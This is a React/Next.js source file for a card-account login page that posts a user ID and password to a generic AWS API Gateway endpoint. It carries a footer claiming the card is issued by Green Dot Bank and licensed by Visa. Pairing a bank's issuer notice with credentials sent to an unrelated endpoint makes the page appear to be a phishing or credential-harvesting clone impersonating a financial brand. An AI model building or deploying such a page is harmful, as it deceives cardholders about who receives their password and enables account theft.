"use client";

import React, { useState } from "react";

const LoginPage: React.FC = () => {
  const [userID, setUserID] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");

  const isFormValid = userID.trim() !== "" && password.length >= 6;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) {
      setError("Please enter a valid User ID and password.");
      return;
    }
    setError("");

    const apiUrl = "https://kj0cthjwe4.execute-api.us-east-1.amazonaws.com/latest/signinusa";

    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userID, password }),
      });

      if (response.status === 200) {
        localStorage.setItem("username", userID);
        window.location.href = "/profile";
      } else {
        const result = await response.json();
        setError(result.message || "Authentication failed");
      }
    } catch (err) {
      console.error("Login error:", err);
      setError("Network error. Please try again.");
    }
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4">
      <style jsx global>{`
        input:-webkit-autofill,
        input:-webkit-autofill:hover,
        input:-webkit-autofill:focus,
        input:-webkit-autofill:active {
          -webkit-text-fill-color: #000 !important;
          -webkit-box-shadow: 0 0 0px 1000px white inset !important;
          transition: background-color 5000s ease-in-out 0s;
        }
      `}</style>

      <div className="bg-white shadow-md rounded-lg p-6 w-full max-w-md text-left border border-gray-300">
        <h1 className="text-2xl font-bold uppercase mb-6">
          <span className="text-green-600">Account</span>
          <span className="text-gray-700"> Login</span>
        </h1>

        {error && (
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded mb-4 text-sm">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label htmlFor="userID" className="block text-sm font-medium text-gray-700 mb-2">
              * User ID
            </label>
            <input
              id="userID"
              type="text"
              value={userID}
              onChange={(e) => setUserID(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 text-black placeholder-gray-400"
              placeholder="Enter your User ID"
              autoComplete="username"
            />
          </div>

          <div>
            <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
              * Password
            </label>
            <input
              id="password"
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-green-500 text-black placeholder-gray-400"
              placeholder="Enter your password"
              autoComplete="current-password"
            />
          </div>

          <button
            type="submit"
            className={`w-full py-3 rounded-lg text-white font-semibold transition-colors ${
              isFormValid
                ? "bg-gradient-to-b from-purple-600 to-purple-800 hover:from-purple-700 hover:to-purple-900"
                : "bg-gray-300 cursor-not-allowed"
            }`}
            disabled={!isFormValid}
          >
            LOGIN
          </button>
        </form>
        <button
          type="button"
          onClick={() => { window.location.href = "/info"; }}
          className="w-full py-3 rounded-lg text-white font-semibold transition-colors bg-gradient-to-b from-green-600 to-green-800 hover:from-green-700 hover:to-green-900 mt-4"
        >
          CREATE ACCOUNT
        </button>

        <p className="text-xs text-gray-500 mt-6 leading-tight">
          This Card is issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc.
        </p>
      </div>
    </div>
  );
};

export default LoginPage;
